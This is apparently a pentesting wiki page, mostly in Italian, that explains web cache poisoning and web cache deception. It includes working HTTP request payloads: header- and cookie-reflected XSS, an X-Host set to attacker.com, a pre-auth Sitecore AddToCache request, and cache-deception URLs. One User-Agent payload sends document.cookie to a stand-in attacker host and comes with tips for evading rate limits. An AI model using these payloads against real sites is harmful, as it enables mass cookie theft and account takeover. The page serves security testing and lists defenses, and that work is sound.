# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## La differenza

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

## Cache Poisoning

Cache poisoning mira a manipolare la client-side cache per costringere i client a caricare risorse inaspettate, parziali o sotto il controllo di un attacker. L'entità dell'impatto dipende dalla popolarità della pagina interessata, poiché la response avvelenata viene servita esclusivamente agli utenti che visitano la pagina durante il periodo di contaminazione della cache.

L'esecuzione di un attacco di cache poisoning comporta diversi passaggi:

1. **Identification of Unkeyed Inputs**: sono parametri che, pur non essendo necessari affinché una request venga cached, possono modificare la response restituita dal server. Identificare questi input è cruciale poiché possono essere sfruttati per manipolare la cache.
2. **Exploitation of the Unkeyed Inputs**: dopo aver identificato gli unkeyed inputs, il passo successivo è capire come abusare di questi parametri per modificare la response del server a vantaggio dell'attacker.
3. **Ensuring the Poisoned Response is Cached**: l'ultimo passo è assicurarsi che la response manipolata venga memorizzata nella cache. In questo modo, qualsiasi utente che accede alla pagina interessata mentre la cache è avvelenata riceverà la response contaminata.

### Scoperta: Controlla gli header HTTP

Di solito, quando una response è stata **stored in the cache** sarà presente un **header che lo indica**; puoi controllare quali header è meglio prendere in considerazione in questo post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Scoperta: Codici di errore in cache

Se pensi che la response venga memorizzata in una cache, potresti provare a **inviare richieste con un header malformato**, le quali dovrebbero rispondere con uno **status code 400**. Poi prova ad accedere la richiesta normalmente e se la **response è uno status code 400**, sai che è vulnerabile (e potresti anche eseguire un DoS).

Puoi trovare più opzioni in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Tieni però presente che **a volte questi tipi di status code non vengono cached**, quindi questo test potrebbe non essere affidabile.

### Scoperta: Identificare e valutare unkeyed inputs

Puoi usare [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) per **brute-force parameters and headers** che possono **modificare la response della pagina**. Per esempio, una pagina potrebbe usare l'header `X-Forwarded-For` per indicare al client di caricare lo script da lì:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Indurre una risposta dannosa dal server back-end

Una volta identificato il parametro/header verifica come viene **sanitizzato** e **dove** viene **riflesso** o come influisce sulla risposta dal header. Riesci ad abusarne comunque (perform an XSS or load a JS code controlled by you? perform a DoS?...)

### Mettere la risposta in cache

Una volta che hai **identificato** la **pagina** che può essere sfruttata, quale **parametro**/**header** usare e **come** **abusarne**, devi fare in modo che la pagina venga messa in cache. A seconda della risorsa che stai cercando di inserire nella cache questo può richiedere del tempo, potresti doverci provare per diversi secondi.

L'header **`X-Cache`** nella risposta può essere molto utile poiché può assumere il valore **`miss`** quando la richiesta non è stata cacheata e il valore **`hit`** quando è in cache.\
L'header **`Cache-Control`** è inoltre utile per sapere se una risorsa viene cacheata e quando sarà la prossima volta che la risorsa verrà messa in cache: `Cache-Control: public, max-age=1800`

Un altro header interessante è **`Vary`**. Questo header è spesso usato per **indicare header aggiuntivi** che sono trattati come **parte della chiave della cache** anche se normalmente non sono usati come chiave. Pertanto, se l'attaccante conosce il `User-Agent` della vittima che sta prendendo di mira, può avvelenare la cache per gli utenti che usano quel specifico `User-Agent`.

Un altro header relativo alla cache è **`Age`**. Definisce il tempo in secondi che l'oggetto è rimasto nella cache del proxy.

Quando metti una richiesta in cache, fai **attenzione agli header che usi** perché alcuni di essi potrebbero essere **usati inaspettatamente** come **chiave** e la **vittima dovrà usare lo stesso header**. Testa sempre un Cache Poisoning con **browser diversi** per verificare se funziona.

## Esempi di sfruttamento

### Esempio più semplice

Un header come `X-Forwarded-For` viene riflesso nella risposta senza sanitizzazione.\
Puoi inviare un payload XSS di base e avvelenare la cache così chiunque acceda alla pagina verrà colpito da XSS:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nota che questo avvelenerà una request a `/en?region=uk` e non a `/en`_

### Cache poisoning per DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning attraverso CDNs

In **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** viene spiegato il seguente semplice scenario:

- La CDN memorizzerà nella cache tutto ciò che si trova sotto `/share/`
- La CDN NON decodificherà né normalizzerà `%2F..%2F`, pertanto può essere usato come **path traversal per accedere ad altre posizioni sensibili che verranno memorizzate nella cache** come `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Il web server DECODERÀ e normalizzerà `%2F..%2F`, e risponderà con `/api/auth/session`, che **contiene l'auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

I cookie possono anche essere riflessi nella risposta di una pagina. Se riesci ad abusarne per causare una XSS, ad esempio, potresti essere in grado di sfruttare l'XSS in diversi client che caricano la risposta memorizzata nella cache malevola.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Check:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning con path traversal per rubare API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.

This is also explained better in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Sometimes you will need to **exploit several unkeyed inputs** to be able to abuse a cache. For example, you may find an **Open redirect** if you set `X-Forwarded-Host` to a domain controlled by you and `X-Forwarded-Scheme` to `http`. **If** the **server** is **forwarding** all the **HTTP** requests **to HTTPS** and using the header `X-Forwarded-Scheme` as the domain name for the redirect, you can control where the page is pointed by the redirect.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Sfruttare con `Vary` header limitato

Se scopri che l'header **`X-Host`** viene usato come **nome di dominio per caricare una risorsa JS**, ma l'header **`Vary`** nella risposta indica **`User-Agent`**, allora devi trovare un modo per exfiltrate il `User-Agent` della vittima e poison the cache usando quel `User-Agent`:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Invia una richiesta GET con la request sia nell'URL sia nel body. Se il web server usa quella del body ma il cache server mette in cache quella dell'URL, chiunque acceda a quell'URL userà in realtà il parametro proveniente dal body. Come la vuln che James Kettle ha trovato sul sito di Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Ad esempio è possibile separare **parameters** in server ruby usando il char **`;`** invece di **`&`**. Questo può essere usato per inserire valori di parametri senza chiave all'interno di quelli con chiave e abusarne.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Scopri come eseguire [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Test automatizzati per Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) può essere usato per testare automaticamente per web cache poisoning. Supporta molte tecniche diverse ed è altamente personalizzabile.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Questo pattern osservato in ambiente reale concatena un primitivo di reflection basato su header con il comportamento di CDN/WAF per avvelenare in modo affidabile l'HTML cached servito ad altri utenti:

- L'HTML principale rifletteva un header di richiesta non attendibile (es., `User-Agent`) in contesto eseguibile.
- Il CDN rimuoveva gli header di cache ma esisteva una cache interna/origin. Il CDN inoltre auto-cached le richieste che terminano con estensioni statiche (es., `.js`), mentre il WAF applicava ispezioni di contenuto più deboli alle GET per asset statici.
- Quirks nel flusso di richiesta permettevano a una richiesta a un percorso `.js` di influenzare la cache key/variant usata per l'HTML principale successivo, abilitando XSS cross-user tramite header reflection.

Ricetta pratica (osservata su un popolare CDN/WAF):

1) Da un IP pulito (evitare downgrade basati sulla reputazione precedente), imposta un `User-Agent` malevolo via browser o Burp Proxy Match & Replace.  
2) In Burp Repeater, prepara un gruppo di due richieste e usa "Send group in parallel" (la modalità single-packet funziona meglio):
- First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.
- Immediately after: GET the main page (`/`).  
3) The CDN/WAF routing race plus the auto-cached `.js` often seeds a poisoned cached HTML variant that is then served to other visitors sharing the same cache key conditions (e.g., same `Vary` dimensions like `User-Agent`).

Esempio header payload (per esfiltrare cookie non-HttpOnly):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Many CDNs hide cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid rate-limit or reputation triggers.
- Using an IP from the CDN's own cloud sometimes improves routing consistency.
- If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution or is bypassed by context.

Impact:

- Se i cookie di sessione non sono `HttpOnly`, è possibile un zero-click ATO esfiltrando in massa `document.cookie` da tutti gli utenti a cui viene servito l'HTML avvelenato.

Defenses:

- Smettere di riflettere gli header della richiesta nell'HTML; se inevitabile, applicare una codifica contestuale rigorosa. Allineare le politiche di cache del CDN e dell'origin ed evitare di variare in base ad header non attendibili.
- Assicurarsi che il WAF applichi l'ispezione del contenuto in modo consistente alle richieste `.js` e ai percorsi statici.
- Impostare `HttpOnly` (e `Secure`, `SameSite`) sui cookie di sessione.

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Questa scrive HTML arbitrario sotto una cache key scelta dall'attaccante, consentendo un avvelenamento preciso una volta note le cache key.

Per i dettagli completi (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Vulnerable Examples

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS inoltrava il fragment presente nella URL senza rimuoverlo e generava la cache key usando solo host, path e query (ignorando il fragment). Quindi la request `/#/../?r=javascript:alert(1)` veniva inviata al backend come `/#/../?r=javascript:alert(1)` e la cache key non conteneva il payload, solo host, path e query.

### GitHub CP-DoS

Inviare un valore errato nell'header content-type scatenava una risposta 405 memorizzata nella cache. La cache key conteneva il cookie quindi era possibile attaccare solo utenti non autenticati.

### GitLab + GCP CP-DoS

GitLab usa i GCP buckets per memorizzare contenuti statici. **GCP Buckets** supportano l'header **`x-http-method-override`**. Quindi era possibile inviare l'header `x-http-method-override: HEAD` e avvelenare la cache facendola ritornare un corpo di risposta vuoto. Poteva inoltre supportare il metodo `PURGE`.

### Rack Middleware (Ruby on Rails)

Nelle applicazioni Ruby on Rails viene spesso utilizzato il Rack middleware. Lo scopo del codice Rack è prendere il valore dell'header **`x-forwarded-scheme`** e impostarlo come scheme della request. Quando viene inviato l'header `x-forwarded-scheme: http` si verifica un redirect 301 alla stessa posizione, potenzialmente causando una Denial of Service (DoS) su quella risorsa. Inoltre, l'applicazione potrebbe riconoscere l'header `X-forwarded-host` e reindirizzare gli utenti all'host specificato. Questo comportamento può portare al caricamento di file JavaScript dal server dell'attaccante, rappresentando un rischio di sicurezza.

### 403 and Storage Buckets

Cloudflare in passato metteva in cache le risposte 403. Tentare di accedere a S3 o Azure Storage Blobs con Authorization header errati restituiva un 403 che veniva memorizzato nella cache. Anche se Cloudflare ha smesso di mettere in cache le risposte 403, questo comportamento potrebbe essere ancora presente in altri servizi proxy.

### Injecting Keyed Parameters

Le cache spesso includono parametri GET specifici nella cache key. Per esempio, Varnish usato da Fastly memorizzava il parametro `size` nelle richieste. Tuttavia, se veniva inviata anche una versione URL-encoded del parametro (es. `siz%65`) con un valore errato, la cache key sarebbe stata costruita usando il parametro `size` corretto. Però il backend avrebbe processato il valore nel parametro URL-encoded. URL-encoding del secondo parametro `size` portava alla sua omissione dalla cache ma al suo utilizzo dal backend. Assegnare a questo parametro il valore 0 produceva un errore 400 Bad Request cacheable.

### User Agent Rules

Alcuni sviluppatori bloccano richieste con user-agents corrispondenti a tool ad alto traffico come FFUF o Nuclei per gestire il carico del server. Ironia della sorte, questo approccio può introdurre vulnerabilità come cache poisoning e DoS.

### Illegal Header Fields

L'[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specifica i caratteri accettabili nei nomi degli header. Gli header che contengono caratteri fuori dall'intervallo **tchar** dovrebbero idealmente causare una risposta 400 Bad Request. In pratica, i server non sempre aderiscono a questo standard. Un esempio notevole è Akamai, che inoltra header con caratteri non validi e memorizza qualsiasi errore 400, purché l'header `cache-control` non sia presente. È stato identificato un pattern sfruttabile dove l'invio di un header con un carattere illegale, come `\`, avrebbe prodotto un 400 Bad Request memorizzabile nella cache.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

First of all note that **extensions** such as `.css`, `.js`, `.png` etc are usually **configured** to be **saved** in the **cache.** Therefore, if you access `www.example.com/profile.php/nonexistent.js` the cache will probably store the response because it sees the `.js` **extension**. But, if the **application** is **replaying** with the **sensitive** user contents stored in _www.example.com/profile.php_, you can **steal** those contents from other users.

Other things to test:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In the example, it is explained that if you load a non-existent page like _http://www.example.com/home.php/non-existent.css_ the content of _http://www.example.com/home.php_ (**with the user's sensitive information**) is going to be returned and the cache server is going to save the result.\
Then, the **attacker** can access _http://www.example.com/home.php/non-existent.css_ in their own browser and observe the **confidential information** of the users that accessed before.

Note that the **cache proxy** should be **configured** to **cache** files **based** on the **extension** of the file (_.css_) and not base on the content-type. In the example _http://www.example.com/home.php/non-existent.css_ will have a `text/html` content-type instead of a `text/css` mime type.

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Automatic Tools

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
